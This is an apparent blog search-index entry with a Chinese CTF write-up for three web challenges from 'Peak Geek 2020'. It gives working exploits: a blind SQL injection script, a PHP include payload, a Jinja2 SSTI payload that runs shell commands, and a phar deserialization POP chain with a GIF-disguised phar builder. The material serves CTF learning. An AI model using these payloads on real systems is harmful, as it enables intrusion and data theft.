<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>巅峰极客2020 部分题目writeup</title>
      <link href="2020/09/26/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22020-wp/"/>
      <url>2020/09/26/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22020-wp/</url>
      
        <content type="html"><![CDATA[<p>四道题做了三道还行！🤭</p><a id="more"></a><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="babyback"><a href="#babyback" class="headerlink" title="babyback"></a>babyback</h3><p>sql注入，fuzz一下，发现过滤了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union and select &#39; &quot; - &#x3D; like &amp; mid</span><br></pre></td></tr></table></figure><p>过滤单双引号，马上想到<code>\</code>，发现可以布尔盲注，盲猜密码字段为<code>password</code>，exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://eci-2zedr7xc8tymr58mx2vp.cloudeci1.ichunqiu.com/index.php&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">500</span>):</span><br><span class="line">    f1=flag</span><br><span class="line">    top=<span class="number">127</span></span><br><span class="line">    low=<span class="number">33</span></span><br><span class="line">    <span class="keyword">while</span> low&lt;=top:</span><br><span class="line">        mid=(top+low)//<span class="number">2</span></span><br><span class="line">        data=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin\\&#x27;</span>,<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;or if((ord(substr(password,&#123;&#125;,1))&gt;&#123;&#125;),1,0)#&#x27;</span>.format(str(i),str(mid))&#125;</span><br><span class="line">        data1=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin\\&#x27;</span>,<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;or if((ord(substr(password,&#123;&#125;,1)) in (&#123;&#125;)),1,0)#&#x27;</span>.format(str(i),str(mid))&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r1=requests.post(url,data=data1)</span><br><span class="line">            print(i,mid)</span><br><span class="line">            <span class="keyword">if</span> len(r1.text)!=<span class="number">2984</span>:</span><br><span class="line">                flag+=chr(mid)</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            r=requests.post(url,data=data)</span><br><span class="line">            <span class="keyword">if</span> len(r.text)==<span class="number">2984</span>:</span><br><span class="line">                top=mid<span class="number">-1</span></span><br><span class="line">            <span class="keyword">if</span> len(r.text)!=<span class="number">2984</span>:</span><br><span class="line">                low=mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">if</span> flag==f1:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>注出密码为<code>uAreRigHt</code>，登陆发现是个代码执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>($command.<span class="string">&quot;=false&quot;</span>);</span><br></pre></td></tr></table></figure><p>并且过滤了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">空格 ^ &#39; &quot; ( </span><br></pre></td></tr></table></figure><p>可以直接包含，payload，取反部分为<code>/flag</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command&#x3D;include~%D0%99%93%9E%98?&gt;</span><br></pre></td></tr></table></figure><h3 id="babyflask"><a href="#babyflask" class="headerlink" title="babyflask"></a>babyflask</h3><p>登陆的地方同户名ssti，前端js验证</p><p>直接p神的payload就可以打：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">loged?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><h3 id="babyphp2"><a href="#babyphp2" class="headerlink" title="babyphp2"></a>babyphp2</h3><p>扫目录发现<code>www.zip</code>,<code>classes.php</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $age=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $nickname=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $backup;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;username&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">        $mysqli=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;id=$mysqli-&gt;login();</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;id)&#123;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;id&#x27;</span>]=<span class="keyword">$this</span>-&gt;id;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;login&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;你的ID是&quot;</span>.$_SESSION[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;你好！&quot;</span>.$_SESSION[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;window.location.href=&#x27;upload.php&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $uploader=<span class="keyword">new</span> Upload();</span><br><span class="line">        $uploader-&gt;upload();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $reader=<span class="keyword">new</span> reader();</span><br><span class="line">        $reader-&gt;read($_POST[<span class="string">&#x27;filename&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname-&gt;backup=<span class="keyword">$this</span>-&gt;backup;</span><br><span class="line">        $user = <span class="keyword">new</span> User();</span><br><span class="line">        $user-&gt;id = $_SESSION[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">        $user-&gt;nickname = $_SESSION[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">        <span class="keyword">return</span> serialize($user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hostname=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbuser=<span class="string">&quot;p3rh4ps&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbpass=<span class="string">&quot;p3rh4ps&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $database=<span class="string">&quot;p3rh4ps&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $mysqli;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=$_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mysqli=<span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;hostname, <span class="keyword">$this</span>-&gt;dbuser, <span class="keyword">$this</span>-&gt;dbpass, <span class="keyword">$this</span>-&gt;database);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;连接失败，错误:&quot;</span> . <span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $sql=<span class="string">&quot;select id,password from users where username=?&quot;</span>;</span><br><span class="line">        $result=<span class="keyword">$this</span>-&gt;mysqli-&gt;prepare($sql);</span><br><span class="line">        $result-&gt;bind_param(<span class="string">&#x27;s&#x27;</span>, <span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        $result-&gt;execute();</span><br><span class="line">        $result-&gt;bind_result($idResult, $passwordResult);</span><br><span class="line">        $result-&gt;fetch();</span><br><span class="line">        $result-&gt;close();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $idResult;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$idResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;用户不存在!&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (md5(<span class="keyword">$this</span>-&gt;password)!==$passwordResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;密码错误！&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;token&#x27;</span>]=<span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> $idResult;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;token;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Upload</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $flag;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $ext;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;flag = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;black_list = [<span class="string">&#x27;ph&#x27;</span>, <span class="string">&#x27;ht&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;pe&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;co&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $ext = substr($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], strpos($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], <span class="string">&#x27;.&#x27;</span>));</span><br><span class="line">        $reg=implode(<span class="string">&quot;|&quot;</span>,<span class="keyword">$this</span>-&gt;black_list);</span><br><span class="line">        $reg = <span class="string">&quot;/&quot;</span> . $reg . <span class="string">&quot;\x|\s|[\x01-\x20]/i&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(preg_match($reg, $ext))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;flag = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ext = $ext;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;flag = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $_FILES[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;check();</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;flag)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">                <span class="keyword">if</span> ($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;Error: &quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">if</span> (file_exists(<span class="string">&quot;upload/&quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">                        <span class="keyword">echo</span> $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; already exists. &quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">if</span> ($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &gt; <span class="number">10240</span>)&#123;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;too big&quot;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span>&#123;</span><br><span class="line">                            $new_addr = $_SERVER[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>] . <span class="string">&quot;/upload/&quot;</span> . md5($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]) . <span class="keyword">$this</span>-&gt;ext;</span><br><span class="line">                            <span class="keyword">echo</span> $new_addr;</span><br><span class="line">                            move_uploaded_file($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], $new_addr);</span><br><span class="line">                            <span class="keyword">return</span> $new_addr;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Noooooooooooooooooooooooooooo!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Reader</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $result;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params">$filename</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&quot;/flag/i&quot;</span>,$filename))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;想多了嗷&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&quot;/sh/i&quot;</span>,$filename))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nooooooooooo!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&quot;/^php|^file|^gopher|^http|^https|^ftp|^data|^phar|^smtp|^dict|^zip/i&quot;</span>,$filename))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Invid Schema!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents($filename);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params">$name,$val</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents($val);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>upload.php</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$user=<span class="keyword">new</span> User();</span><br><span class="line">$user-&gt;upload();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>read.php</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$user=<span class="keyword">new</span> User();</span><br><span class="line">$user-&gt;read();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>明显phar反序列化，先看下pop链：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dbCtrl::__destruct() -&gt; User::__toString() -&gt; $this-&gt;nickname-&gt;backup&#x3D;$this-&gt;backup -&gt; __set($name,$val)</span><br></pre></td></tr></table></figure><p>就可以造成任意文件读取</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/^php|^file|^gopher|^http|^https|^ftp|^data|^phar|^smtp|^dict|^zip/i&quot;</span>,$filename))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Invid Schema!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>限制了前缀，这个地方可以将其他协议流放在前面绕过，注意phar指向的文件不能没后缀</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">compress.zlib:&#x2F;&#x2F;phar:&#x2F;&#x2F;upload&#x2F;a.gif</span><br><span class="line">compress.bzip2:&#x2F;&#x2F;phar:&#x2F;&#x2F;upload&#x2F;a.gif</span><br><span class="line">php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;phar:&#x2F;&#x2F;upload&#x2F;a.gif</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hostname=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbuser=<span class="string">&quot;p3rh4ps&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbpass=<span class="string">&quot;p3rh4ps&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $database=<span class="string">&quot;p3rh4ps&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $mysqli;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token = <span class="keyword">new</span> User();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $age=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $nickname=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $backup;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname = <span class="keyword">new</span> Reader;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;backup = <span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Reader</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $result;</span><br><span class="line">&#125;</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;aaa.phar&quot;</span>); <span class="comment">//后缀名必须为 phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar -&gt; setStub(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line">$object = <span class="keyword">new</span> dbCtrl;</span><br><span class="line">$phar-&gt;setMetadata($object); <span class="comment">//将自定义的 meta-data 存入 manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;a.txt&quot;</span>, <span class="string">&quot;a&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf crypto部分题目writeup</title>
